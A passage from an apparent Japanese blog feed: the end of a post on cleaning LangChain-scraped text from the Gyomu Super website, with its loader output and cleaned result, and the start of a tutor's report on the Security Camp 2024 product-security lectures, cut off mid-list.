\'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'パルメザンチーズのリゾット\\\\n\' +      \'イタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！\\\\n\' +      \'詳しくはこちら パルメザンチーズ[要冷蔵] 詳しくはこちら PICK UP!おすすめレシピ レシピをもっと見る SPECIAL TOPICS 特集\\\\n\' +      \'特集をもっと見る SNS 公式Instagram・公式X（旧Twitter） Tweets\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'Tweets by GyomusuperOFCL 公式Instagram 公式X（旧Twitter）\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'公式Instagram 公式X（旧Twitter）\\\\n\' +      \'2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭\\\\n\' +      \'日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。\\\\n\' +      \'一覧を見る 『世界の本物』を直輸入！\\\\n\' +      \'業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！\\\\n\' +      \'安さの秘密 自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'自慢の国内自社工場の『オリジナル』\\\\n\' +      \'国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！\\\\n\' +      \'安全・安心の秘密\\\\n\' +      \'スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。\\\\n\' +      \'神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。\\\\n\' +      \'.detail_footer{display: none;} @media screen and (max-width: 767px){\\\\n\' +      \'.detail_footer{ display: block; position: fixed; bottom: 0; width: 100%;\\\\n\' +      \'z-index: 20; } .detail_footer_con{ display: flex; justify-content: space-around;\\\\n\' +      \'align-items: flex-start; max-width: 400px; width: 97%; margin: 0 auto; }\\\\n\' +      \'.detail_footer_con a{ text-decoration: none; color: #fff; } .footer_btn{\\\\n\' +      \'background-color: #13a555; padding: 10px; border-radius: 10px 10px 0 0; width:\\\\n\' +      \'32%; font-size: 11px; color: #fff; display: flex; flex-direction: column;\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'#13a555; padding: 10px; border-radius: 10px 10px 0 0; width: 32%; font-size:\\\\n\' +      \'11px; color: #fff; display: flex; flex-direction: column; justify-content:\\\\n\' +      \'center; align-items: center; height: 55px; } .footer_btn p{ margin: 0; }\\\\n\' +      \'.footer_btn img{ margin-bottom: 5px; } .shop_img{ width: 24%; } .bargain_img{\\\\n\' +      \'width: 23%; } .pro_img{ width: 21%; } .to_img{ width: 22%; } .re_img{ width:\\\\n\' +      \'25%; } .footer_x, .footer_insta{ width: 13%; border-radius: 40px; } .footer_x{\\\\n\' +      \'background-color: #000; padding: 13px; } .footer_insta{ background-color:\\\\n\' +      \'#ff0069; padding: 12px; } .footer_btn, .footer_x, .footer_insta{ box-shadow: 1px\\\\n\' +      \'1px 4px 0 rgba(0, 0, 0, .5); } } 店舗検索 特売情報 ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品\\\\n\' +      \'国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \'ホーム WEBチラシ 店舗案内 ミラクルレシピ 商品紹介 直輸入商品 国内自社工場商品 業務スーパーとは 安さの秘密 安全安心の取り組み 商品開発事前チェック\\\\n\' +      \'現地工場チェック 品質安全検査 商品検証 FC加盟店募集 業務スーパー5つの強み 業務スーパーの特徴 オープンまでのプロセス 体制について 契約概要・加盟条件\\\\n\' +      \'物件・商品のご提案募集 お問い合わせ　｜　会社案内　｜　サイトポリシー　｜　個人情報の保護に関する基本方針\\\\n\' +      \'〒675-0063兵庫県加古川市加古川町平野125番1 \xa92018-document.write(new Date().getFullYear());\\\\n\' +      \'Gyomu Super All Rights Reserved. footer small { display: block; text-align:\\\\n\' +      \'right; padding-right: 10px; margin: 0 3%; color: #fff; } @media (max-width:64em)\\\\n\' +      \'{ footer small { display: block; text-align: left; padding-right: 10px; margin:\\\\n\' +      \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"20px 4%!important; color: #fff; } } $(\'.main_img\\\\n\\" +      \\".swiper-slide\').click(function(){ var top_slide =\\\\n\\" +      \\"$(this).children(\'a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_slide\', \'event_label\' : \'top_slide_\'+top_slide+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_slide\', {\'top_slide\' : top_slide}); }); $(\'.topics\').click(function() { var\\\\n\\" +      \\"page_url = $(\'.topics a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\'\\\\n\\" +      \\": \'topics_bnr\', \'event_label\' : \'topics_bnr_\'+page_url+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'topics_bnr\', {\'topics_bnr\' : page_url}); });\\\\n\\" +      \\"$(\'.top_recipe_bnr\').click(function(){ var top_recipe_bnr = $(\'.top_recipe_bnr\\\\n\\" +      \\"a\').attr(\'href\'); gtag(\'event\', \'click\', {\'event_category\' : \'top_recipe_bnr\',\\\\n\\" +      \\"\'event_label\' : \'top_recipe_bnr_\'+top_recipe_bnr+\'\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\',\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'top_recipe_bnr\', {\'top_recipe_bnr\' : top_recipe_bnr}); });\\\\n\\" +      \\"$(\'.gs_forum\').click(function(){ var gs_forum = $(\'.gs_forum .forumimg\\\\n\\" +      \\"img\').attr(\'src\'); gtag(\'event\', \'click\', {\'event_category\' : \'gs_forum\',\\\\n\\" +      \\"\'event_label\' : \'gs_forum_\'+gs_forum+\'\'}); gtag(\'event\', \'gs_forum\', {\'gs_forum\'\\\\n\\" +      \\": gs_forum}); }); $(\'.information dt\').click(function(){ var news_title =\\\\n\\" +      \\"$(this).children(\'p\').text(); gtag(\'event\', \'click\', {\'event_category\' : \'news\',\\\\n\\" +      \\"\'event_label\' : \'news_\'+news_title+\'\'}); gtag(\'event\', \'news\', {\'news\' :\\\\n\\" +      \\"news_title}); }); $(\'.yasusa\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'yasusa_himitsu\', \'event_label\' : \'yasusa_himitsu\'});\\\\n\\" +      \\"gtag(\'event\', \'yasusa_himitsu\', {\'yasusa_himitsu\' : \'yasusa_himitsu\'}); });\\\\n\\" +      \\"$(\'.anzen\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'anzen_himitsu\', \'event_label\' : \'anzen_himitsu\'}); gtag(\'event\',\\\\n\\" +      \\"\'anzen_himitsu\', {\'anzen_himitsu\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'anzen_himitsu\', \'event_label\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); gtag(\'event\', \'anzen_himitsu\', {\'anzen_himitsu\' :\\\\n\\" +      \\"\'anzen_himitsu\'}); }); $(\'.recipe_btm_link\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'recipe_btm_link\', \'event_label\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); gtag(\'event\', \'recipe_btm_link\', {\'recipe_btm_link\' :\\\\n\\" +      \\"\'recipe_btm_link\'}); }); $(\'.3step_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'3step_btn\', \'event_label\' : \'3step_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'3step_btn\', {\'3step_btn\' : \'3step_btn\'}); });\\\\n\\" +      \\"$(\'.setsuyaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'setsuyaku_btn\', \'event_label\' : \'setsuyaku_btn\'}); gtag(\'event\',\\\\n\\" +      \\"\'setsuyaku_btn\', {\'setsuyaku_btn\' : \'setsuyaku_btn\'}); });\\\\n\\" +      \\"$(\'.quick_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'quick_btn\', \'event_label\' : \'quick_btn\'}); gtag(\'event\', \'quick_btn\',\\\\n\\" +      \\"{\'quick_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'setsuyaku_btn\'}); }); $(\'.quick_btn\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'quick_btn\', \'event_label\' : \'quick_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'quick_btn\', {\'quick_btn\' : \'quick_btn\'}); });\\\\n\\" +      \\"$(\'.honkaku_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'honkaku_btn\', \'event_label\' : \'honkaku_btn\'}); gtag(\'event\', \'honkaku_btn\',\\\\n\\" +      \\"{\'honkaku_btn\' : \'honkaku_btn\'}); }); $(\'.recipe_item\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'recipe_item\', \'event_label\' :\\\\n\\" +      \\"\'recipe_item\'}); gtag(\'event\', \'recipe_item\', {\'recipe_item\' : \'recipe_item\'});\\\\n\\" +      \\"}); $(\'.all_recipe_btn\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'all_recipe_btn\', \'event_label\' : \'all_recipe_btn\'});\\\\n\\" +      \\"gtag(\'event\', \'all_recipe_btn\', {\'all_recipe_btn\' : \'all_recipe_btn\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_left\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'Visseel\', \'event_label\' : \'Visseel\'}); gtag(\'event\',\\\\n\\" +      \\"\'Visseel\', {\'Visseel\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\": \'all_recipe_btn\'}); }); $(\'.sports_wrap .bun_left\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'Visseel\', \'event_label\' :\\\\n\\" +      \\"\'Visseel\'}); gtag(\'event\', \'Visseel\', {\'Visseel\' : \'Visseel\'}); });\\\\n\\" +      \\"$(\'.sports_wrap .bun_right\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'DeNA\', \'event_label\' : \'DeNA\'}); gtag(\'event\', \'DeNA\',\\\\n\\" +      \\"{\'DeNA\' : \'DeNA\'}); }); $(\'.sale_bnr\').click(function(){ gtag(\'event\', \'click\',\\\\n\\" +      \\"{\'event_category\' : \'sale_bnr_mini\', \'event_label\' : \'sale_bnr_mini\'});\\\\n\\" +      \\"gtag(\'event\', \'sale_bnr_mini\', {\'sale_bnr_mini\' : \'sale_bnr_mini\'}); });\\\\n\\" +      \\"$(\'.top_ec_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_ec_btn\', \'event_label\' : \'top_ec_btn\'}); gtag(\'event\', \'top_ec_btn\',\\\\n\\" +      \\"{\'top_ec_btn\' : \'top_ec_btn\'}); }); $(\'.top_halal_btn\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_halal_btn\', \'event_label\' :\\\\n\\" +      \\"\'top_halal_btn\'}); gtag(\'event\', \'top_halal_btn\', {\'top_halal_btn\' :\\\\n\\" +      \\"\'top_halal_btn\'}); }); $(\'.gyomuca_slide\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'gyomuca_slide\', \'event_label\' : \'gyomuca_slide\'});\\\\n\\" +      \\"gtag(\'event\', \'gyomuca_slide\', {\'gyomuca_slide\' : \'gyomuca_slide\'}); });\\\\n\\" +      \\"$(\'.gyomuca_btn\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'gyomuca_btn\', \'event_label\' : \'gyomuca_btn\'}); gtag(\'event\', \'gyomuca_btn\',\\\\n\\" +      \\"{\'gyomuca_btn\' : \'gyomuca_btn\'}); }); $(\'.top_shop_bnr a\').click(function(){\\\\n\\" +      \\"gtag(\'event\', \'click\', {\'event_category\' : \'top_shop_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); gtag(\'event\', \'top_shop_bnr\', {\'top_shop_bnr\' :\\\\n\\" +      \\"\'top_shop_bnr\'}); }); $(\'.top_bargain_bnr a\').click(function(){ gtag(\'event\',\\\\n\\" +      \\"\'click\', {\'event_category\' : \'top_bargain_bnr\', \'event_label\' :\\\\n\\" +      \\"\'top_bargain_bnr\'}); gtag(\'event\', \'top_bargain_bnr\', {\'top_bargain_bnr\' :\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"a\').click(function(){ gtag(\'event\', \'click\', {\'event_category\' :\\\\n\\" +      \\"\'top_bargain_bnr\', \'event_label\' : \'top_bargain_bnr\'}); gtag(\'event\',\\\\n\\" +      \\"\'top_bargain_bnr\', {\'top_bargain_bnr\' : \'top_bargain_bnr\'}); });\\\\n\\" +      \\"$(document).ready(function() { $(\'.drawer\').drawer(); }); //infoaccordion\\\\n\\" +      `$(function(){ $(\\".infoac dt\\").not(\'#noicon\').on(\\"click\\", function() {\\\\n` +      \'$(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); }); }); //scroll\\\\n\' +      `$(function(){ // #で始まるリンクをクリックしたら実行されます $(\'a[href^=\\"#\\"]\').click(function() { //\\\\n` +      \'スクロールの速度 var speed = 600; // ミリ秒で記述 var href= $(this).attr(\\"href\\"); var target =\\\\n\' +      `$(href == \\"#\\" || href == \\"\\" ? \'html\' : href); var position =\\\\n` +      \\"target.offset().top; $(\'body,html\').animate({scrollTop:position}, speed,\\\\n\\" +      \\"\'swing\'); return false; }); }); //matchHeight $(function(){\\",    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  },  Document {    pageContent: \\"var position = target.offset().top; $(\'body,html\').animate({scrollTop:position},\\\\n\\" +      \\"speed, \'swing\'); return false; }); }); //matchHeight $(function(){\\\\n\\" +      \\"$(\'.mh\').matchHeight(); }); function news_link(id,year) {\\\\n\\" +      \'document.newslink.ne_id.value=id; document.newslink.ne_year.value=year;\\\\n\' +      \'document.newslink.submit(); } $(function(){ $(\\"#acMenu dt\\").on(\\"click\\",\\\\n\' +      \'function() { $(this).next().slideToggle(); $(this).toggleClass(\\"active\\"); });\\\\n\' +      \'}); $(\\".information dl dt\\\\n\' +      `p:contains(\'「酒類の品目等の表示義務」改正に伴う「麦旨」の品目表示及び税率適用区分表示の変更について\')\\").find(\'a\').attr({target:\\"_blank\\"});\\\\n` +      \'objectFitImages();\',    metadata: { source: \'https://www.gyomusuper.jp/\', loc: [Object] },    id: undefined  }]CheerioWebBaseLoaderはbodyタグ内を読むのですが、styleタグやscriptタグが入ってしまっているからなんですね。そこで、CheerioWebBaseLoaderを使わず、URLからfetchして、cheerioTextで得たbodyタグの中からstyleタグやscriptタグの中身を除去したコードを実行。npx ts-node webLoad.ts https://www.gyomusuper.jp/綺麗に取れました！！bodyContent:お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針ホーム商品紹介ミラクルレシピ特集一覧安心安全の取り組み業務スーパーとはGyomucaお問い合わせオンラインショップFC加盟店募集会社案内日本語/ENGLISH/中文NEWITEM新着商品新着ホット＆スパイシーヌードルホットでスパイシーなインスタントヌードルです。スパイスをきかせたスープは、ピリッとした辛さの中にも旨みがあり、クセになります！熱湯をかけて粉末スープと調味オイルを加えるだけの簡単調理も魅力。鍋で煮込んでお好みの具材や、ご飯を入るアレンジもおすすめです。5袋入り。詳しくはこちら詳しくはこちらPICKUP!おすすめ商品商品をもっと見る新着パルメザンチーズのリゾットイタリアの米料理の定番！リゾットです。パルメザンチーズのコクと旨味がたっぷり詰まった濃厚な味わい♪チーズがお好きな方におすすめのレシピです。おうちでお手軽にイタリアンをお楽しみください！詳しくはこちらパルメザンチーズ[要冷蔵]詳しくはこちらPICKUP!おすすめレシピレシピをもっと見るSPECIALTOPICS特集特集をもっと見るSNS公式Instagram・公式X（旧Twitter）TweetsbyGyomusuperOFCL公式Instagram公式X（旧Twitter）2024年8月30日台風10号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風10号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風10号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月19日フジテレビ「めざましテレビ」で紹介されました2024年8月16日（金）放送のフジテレビ「めざましテレビ」で、業務スーパーの商品が紹介されました。放送局：フジテレビ番組名：「めざましテレビ」放送日：2024年8月16日（金）めざましテレビ2024年8月16日台風7号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風7号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業状況につきましては、台風7号の影響による営業に関するお知らせをご確認ください。※最新の情報に関しましては、ご利用の店舗に直接お問い合わせください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。2024年8月15日【セール情報】9月1日（日）から「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」START！いつも業務スーパーをご愛顧いただきありがとうございます！9月1日（日）から10月31日（木）までの2か月間、感謝の気持ちをたっぷり込めた「お買い得まみれ!!総力祭日頃のご愛顧感謝セール」を開催いたします。国内関連工場のオリジナル商品や海外直輸入商品など、とにかくお得なアイテム盛りだくさん！全国の業務スーパーで皆さまのご来店を心よりお待ちしております。<セール期間>【第1弾】2024年9月1日（日）～9月30日（月）【第2弾】2024年10月1日（火）～10月31日（木）<セール対象店舗>全国の業務スーパー各店（※一部店舗を除く）セール特設ページはこちら2024年8月12日台風5号の影響による営業に関するお知らせいつもご愛顧いただき、誠にありがとうございます。台風5号の今後の進路や状況により、お客さまの安全を最優先としまして、一部店舗では営業時間の短縮および臨時休業させていただく場合がございます。各店舗の営業時間や休業のご確認につきましては、台風5号の影響による営業に関するお知らせをご確認ください。大変ご迷惑をおかけしますが、何卒ご了承いただきますようお願いいたします。一覧を見る『世界の本物』を直輸入！業務スーパーには、世界の国々で現地の人々に愛されている『世界の本物』が盛りだくさん！めずらしいものから日本でもなじみのあるものまで、厳選したアイテムを、高品質＆ロープライスで取りそろえています！安さの秘密自慢の国内自社工場の『オリジナル』国内の自社工場で、さまざまな「食」のニーズに応える、オリジナル商品をつくっています！ユニークな商品から日々の食卓に欠かせない商品までバラエティ豊かに低価格で取りそろえています！安全・安心の秘密スポーツには不思議なチカラがあります。こども達の心や体を強くするとともに、アスリート達の真摯な姿は多くの人々に笑顔と感動を与え、夢に向かって挑戦することの大切さを教えてくれます。神戸物産はヴィッセル神戸、横浜DeNAベイスターズ、神戸ストークスのオフィシャルスポンサーとして地域スポーツの発展を支援し、人々のくらしを応援します。店舗検索特売情報ホームWEBチラシ店舗案内ミラクルレシピ商品紹介直輸入商品国内自社工場商品業務スーパーとは安さの秘密安全安心の取り組み商品開発事前チェック現地工場チェック品質安全検査商品検証FC加盟店募集業務スーパー5つの強み業務スーパーの特徴オープンまでのプロセス体制について契約概要・加盟条件物件・商品のご提案募集お問い合わせ｜会社案内｜サイトポリシー｜個人情報の保護に関する基本方針〒675-0063兵庫県加古川市加古川町平野125番1\xa92018-GyomuSuperAllRightsReserved.","isoDate":"2024-08-31T13:34:16.000Z","dateMiliSeconds":1725111256000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"セキュリティ・キャンプ 2024 参加記","link":"https://moz-security.hatenablog.com/entry/2024/08/31/121836","contentSnippet":"8月12日から8月16日までの5日間で開催されたセキュリティ・キャンプ2024 全国大会のBクラス（プロダクトセキュリティ）にチューターとして参加したので、体験記を書き残す。昨年、Bクラス（当時は、Webセキュリティ）を修了し、今年チューターとして、もう一度セキュリティ・キャンプに参加することになった。昨年の参加記は、以下である。今読み返してみると、次はネクスト受講生かチューターで参加したいということを書いており、今年チューターとして参加できたのはとてもよかった。moz-security.hatenablog.com日程表Bクラスの日程は、このような感じだった。6つの専門講義があり、それに加えて共通講義やグループワーク, 特別講演などがあり、毎日8:30~21:00に稼働するというハードスケジュールとなっている。セキュリティ・キャンプ Bクラス スケジュール共通講義、グループワーク共通講義では、ゲームセキュリティや法律、人の心理・行動特性についての講義があった。また、毎日グループワークの時間が30分あり、1グループ4人構成でセキュリティ教育について話しあっていた。コンピュータを全く知らない主婦や子供からコンピュータサイエンスをある程度学んだ学生などさまざまなターゲットに対して、いろいろなアプローチでセキュリティ技術を伝えようとするアイデアがあり、ディスカッションや最終発表を見ていてとてもおもしろかった。専門講義Bクラスでは、プロダクト開発におけるセキュリティをテーマにして、講義が構成されていた。全て４時間の講義で、座学と演習の両方を行う形式になっている。1日目のホームルームでプロデューサーから、講義設計にあたり未知との遭遇の最大化を目標としている旨を伝えられた。知らないこともたくさん出てくるだろうが、「アウトプットを行う→フィードバックを得る→新たな知らないことが生まれる」のループを回すことをセキュリティキャンプを通じて、また、セキュリティキャンプが終わった後も行うことが大事だということを話されていた。また、技術の話だけでなくお金の話も講義に盛り込むようにしており、コストとセキュリティのバランスを見定めるといった、より社会で行われていることを体感して、社会に出た後に活躍してほしいというお話があった。そういう意味で、プロデューサーがBクラスは社会人クラスと言っていたのもおもしろかった。これら２つのことは、講義を全て終えた今、改めてとてもプロデューサーの講義設計に対する意図や思いを感じている。2日目B1: プロダクトセキュリティの展望セキュリティ・キャンプ2024 全国大会 B1 プロダクトセキュリティの展望(#seccamp2024) | ドクセル\\"プロダクトセキュリティの展望\\" では、プロダクトの定義とそれが指す範囲の広さ、非機能要件であるセキュリティと組織としての向き合い方について学んだ。なかでも、社会と技術と資産を面で見れるようになるとセキュリティを俯瞰して見ること・考えることができ、面で見れるようになるためには、社会の変化に敏感になることが重要であるということはとても記憶に残っている。セキュリティを仕事にする上で新技術の把握や継続的な学習は大事だと言われているが、この講義を通して再認識させられた。また、プロダクトの価値を早く・大きく・継続して届けるための技術についても学んだ。これらはお金が密接に絡んでくる点で経営側の視点も必要であり、今まで考えたことがなかったが、組織で自分が影響力を発揮していくためには押さえておく必要はあるし、今後勉強していきたいと思った。最後に、組織規模に応じたセキュリティ対策について学んだ。セキュリティ対策が必要だといっても実際に行うには導入・運用にコストがかかるため、コストとセキュリティのバランスが必要となってくるし、その判断が難しいのはよく言われているためすでにわかっていた。しかし、ではどれくらいの組織規模に対してどのような対策を行うのかということは今まであまり考えたことなく（学生で考える人はあまりいないと思っているが）、グループディスカッションや発表、講師以外の方のお話なども含めてとても学びになった。いろんな会社のいろんな役職の人たちがいるのもセキュリティ・キャンプのよさであると思う。B-2: 情報セキュリティ戦略戦術ワークショップ\\"情報セキュリティ戦略戦術ワークショップ\\" では、組織のセキュリティ対策の進め方やインシデントハンドリングについて学んだ。この講義でも、やはり組織規模に応じたセキュリティ対策についてのお話はあり、やらないといけないことはたくさんあるがどれから取り組むかを考えるといったときに、ベストプラクティスやガイドライン、フレームワークは非常に参考になることがわかった。また、インシデント対応において、まず気付ける仕組みと改善の実施が重要であることがわかった。たしかにログが残っていたり、インシデント発生時にアラートが出なかったりすると、そもそもインシデントに気付けない。そのため、セキュリティ担当でなかったとしても、インシデントに気付くために一開発者としてどのような情報（ログ, メトリクス, アラート）が必要なのかは考えるようにしたいと思った。演習では、受講生がグループでインシデントハンドリングを体験しており、チューターとしてはチャットツールでの関係者とのやり取りを見ていた。インシデントというと私は外部の攻撃者からのサイバー攻撃を想像してしまうが、それだけではない。メールの誤送信などといったオペレーションミスや部署間での情報共有の不足、内部不正なども、ちゃんとインシデントであり、それも意外と発生してしまうことがあることを学んだ。演習で関係者とのやりとりがなかなかうまくいかず、大変そうだったのはとても記憶に残っている（覚えるべきとこはそこじゃないw）。3日目B-3: セキュリティ監視入門セキュリティ監視入門 | Notion\\"セキュリティ監視入門\\" では、監視の重要性と監視アーキテクチャの設計・構築について学んだ。監視をする上で最も重要で、最初に考えなければいけないのはなぜ監視するのか・何のために監視するのかであり、そこが曖昧であると例え監視を行っていて異常を見つけたり、アラートが出たりしても、その後の対応に繋がらないということはとても頭に残っている。この講義でもB-1に引き続いて、組織規模に応じた監視アーキテクチャの構築やSOCやCSIRTといった組織の構築を学んだ。どれだけのコストをセキュリティ対策にかけるかは経営判断だが、現場で何が行われているのかやどのようなデータがどこに存在しているかは把握していなければ、セキュリティ監視を行うことやそれにかかるコストを見積もることはできない。ログの対象となるデータは無限と言っていいほど存在しており、どのログを取るのかとコストのバランスを考えることがセキュリティ担当者としての腕の見せ所であることがわかった。また、セキュリティ監視において大規模な運用が始まると不可逆性はかなり高いことも学んだ。これは、データ移行が大変になるからという理由だったが、私自身今までトライアンドエラーを繰り返すことをよしとしていたため、セキュリティ監視というケースではそれがあまりふさわしくないこともあることがわかった。B-4: モダンなプロダクト開発を攻撃者の視点で捉える\\"モダンなプロダクト開発を攻撃者の視点で捉える\\" 